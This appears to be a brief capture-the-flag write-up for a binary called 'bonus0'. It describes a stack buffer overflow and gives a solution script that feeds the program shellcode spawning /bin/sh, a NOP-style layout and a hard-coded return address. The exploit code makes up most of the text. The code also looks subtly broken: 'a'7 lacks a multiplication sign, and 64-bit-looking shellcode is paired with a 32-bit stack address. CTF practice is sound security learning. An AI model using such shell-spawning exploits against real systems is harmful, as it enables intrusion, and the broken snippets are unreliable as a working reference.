## BONUS 0 HELP

This binary take 2 input with read, and a buffer of 4096,
We need to overwrite the return address using the second input to write the address, to execute a shellcode who is writed on the first input after multiple NOP (no operation \x90) char

### USAGE

```bash
./bonus0
[input]
[input]
...
```

## SOLUTION
To solve this level, run the binary and use thoses instructions:


```bash
./bonus0 <<EOF
$(python -c 'print("\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54")')
$(python -c 'print("\x5e\x0f\x05" + "a"7 + "\x0c\xfe\xff\xbf" + "a"4096)')
EOF
```
